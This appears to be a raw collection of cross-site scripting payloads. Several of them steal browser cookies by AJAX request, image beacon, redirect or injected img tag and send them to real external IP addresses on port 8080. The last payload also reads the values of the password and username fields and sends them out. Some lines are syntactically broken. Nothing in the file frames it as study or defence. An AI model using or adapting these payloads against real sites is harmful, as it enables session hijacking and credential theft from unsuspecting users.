189.132.235.118:8080/?cookie=aaaa

<script type="text/javascript">
var ajax = {};
ajax.x = function () {
    if (typeof XMLHttpRequest !== 'undefined') {
        return new XMLHttpRequest();
    }
    var versions = [
        "MSXML2.XmlHttp.6.0",
        "MSXML2.XmlHttp.5.0",
        "MSXML2.XmlHttp.4.0",
        "MSXML2.XmlHttp.3.0",
        "MSXML2.XmlHttp.2.0",
        "Microsoft.XmlHttp"
    ];

    var xhr;
    for (var i = 0; i < versions.length; i++) {
        try {
            xhr = new ActiveXObject(versions[i]);
            break;
        } catch (e) {
        }
    }
    return xhr;
};

ajax.send = function (url, callback, method, data, async) {
    if (async === undefined) {
        async = true;
    }
    var x = ajax.x();
    x.open(method, url, async);
    x.onreadystatechange = function () {
        if (x.readyState == 4) {
            callback(x.responseText)
        }
    };
    if (method == 'POST') {
        x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    }
    x.send(data)
};

ajax.get = function (url, data, callback, async) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    ajax.send(url + (query.length ? '?' + query.join('&') : ''), callback, 'GET', null, async)
};

ajax.post = function (url, data, callback, async) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    ajax.send(url, callback, 'POST', query.join('&'), async)
};
ajax.get('189.132.235.118:8080/' {cookie,document.cookie}, function() {});
</script>


<script>
ajax.get('189.132.235.118:8080/' {cookie,document.cookie}, function() {});


</script>

<script>
var img = new Image(0,0); img.src='189.132.235.118:8080/?cookie=' + document.cookie; document.body.appendChild(img);
document.write(img)
</script>
<script>
document.location="http://143.110.136.16:8080/?cookie="+document.cookie;
</script>

143.110.136.16
<script>
document.write('<img src="http://143.110.136.16:8080/?cookie=' + document.cookie + '" />')
</script>


<script>
    var p='PASS'
   document.getElementsByName('password').forEach(e=>{console.log(p=p+''+e.value )})
   var us='USER'
      document.getElementsByName('username').forEach(e=>{console.log(u=u+''+e.value )})
      document.write('<img src="http://143.110.136.16:8080/?cookie=' + document.cookie +u+p+'" />')

</script>